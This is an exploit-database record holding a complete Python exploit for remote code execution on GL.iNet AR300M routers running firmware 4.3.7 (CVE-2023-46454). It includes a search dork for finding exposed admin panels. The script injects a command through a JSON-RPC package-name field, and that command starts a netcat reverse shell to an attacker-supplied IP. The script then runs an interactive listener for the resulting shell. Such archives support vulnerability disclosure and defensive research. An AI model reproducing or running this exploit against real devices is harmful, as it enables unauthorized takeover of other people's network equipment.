{"source": "https://www.exploit-db.com/exploits/51852", "vulnName": "GL.iNet AR300M v4.3.7 Remote Code Execution - CVE-2023-46454 Exploit", "vulnEDBID": "51852", "vulnCVE": "N/A", "author": "CYBERAZ0R", "exploitType": "REMOTE", "platform": "HARDWARE", "datePublished": "2024-03-03", "vulnContent": "#!/usr/bin/env python3\n\n# Exploit Title: GL.iNet <= 4.3.7 Remote Code Execution via OpenVPN Client\n# Google Dork: intitle:\"GL.iNet Admin Panel\"\n# Date: XX/11/2023\n# Exploit Author: Michele 'cyberaz0r' Di Bonaventura\n# Vendor Homepage: https://www.gli-net.com\n# Software Link: https://fw.gl-inet.com/firmware/ar300m/nand/release4/openwrt-ar300m-4.3.7-0913-1694589403.tar\n# Version: 4.3.7\n# Tested on: GL.iNet AR300M\n# CVE: CVE-2023-46454\n\nimport socket\nimport requests\nimport readline\nfrom time import sleep\nfrom random import randint\nfrom sys import stdout, argv\nfrom threading import Thread\n\nrequests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)\n\ndef trigger_revshell(url, auth_token, payload):\n sleep(0.25)\n data = {\n  'jsonrpc': '2.0',\n  'id': randint(1000, 9999),\n  'method': 'call',\n  'params': [\n   auth_token,\n   'plugins',\n   'get_package_info',\n   {'name': 'bas{}e-files'.format(payload)}\n  ]\n }\n requests.post(url, json=data, verify=False)\n\ndef get_command_response(s):\n res = ''\n while True:\n  try:\n   resp = s.recv(1).decode('utf-8')\n   res += resp\n  except UnicodeDecodeError:\n   pass\n  except socket.timeout:\n   break\n return res\n\ndef revshell_listen(revshell_ip, revshell_port):\n s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n s.settimeout(5)\n\n try:\n  s.bind((revshell_ip, int(revshell_port)))\n  s.listen(1)\n except Exception as e:\n  print('[X] Exception \"{}\" encountered while binding reverse shell'.format(type(e).__name__))\n  exit(1)\n\n try:\n  clsock, claddr = s.accept()\n  clsock.settimeout(2)\n  if clsock:\n   print('[+] Incoming reverse shell connection from {}:{}, enjoy ;)'.format(claddr[0], claddr[1]))\n   res = ''\n   while True:\n    command = input('$ ')\n    clsock.sendall('{}\\n'.format(command).encode('utf-8'))\n    stdout.write(get_command_response(clsock))\n\n except socket.timeout:\n  print('[-] No connection received in 5 seconds, probably server is not vulnerable...')\n  s.close()\n\n except KeyboardInterrupt:\n  print('\\n[*] Closing connection')\n  try:\n   clsock.close()\n  except socket.error:\n   pass\n  except NameError:\n   pass\n  s.close()\n\ndef main(base_url, auth_token, revshell_ip, revshell_port):\n print('[+] Started GL.iNet <= 4.3.7 RCE exploit')\n\n payload = '$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {} {} >/tmp/f)'.format(revshell_ip, revshell_port)\n print('[+] Reverse shell payload: \"{}\"'.format(payload))\n\n print('[*] Triggering reverse shell connection')\n Thread(target=trigger_revshell, args=(base_url+'/rpc', auth_token, payload)).start()\n\n print('[*] Starting reverse shell on {}:{}'.format(revshell_ip, revshell_port))\n revshell_listen(revshell_ip, revshell_port)\n\n print('[+] Done')\n\nif __name__ == '__main__':\n if len(argv) < 5:\n  print('Usage: {} <TARGET_URL> <AUTH_TOKEN> <REVSHELL_IP> <REVSHELL_PORT>'.format(argv[0]))\n  exit(1)\n\n main(argv[1], argv[2], argv[3], argv[4])\n            "}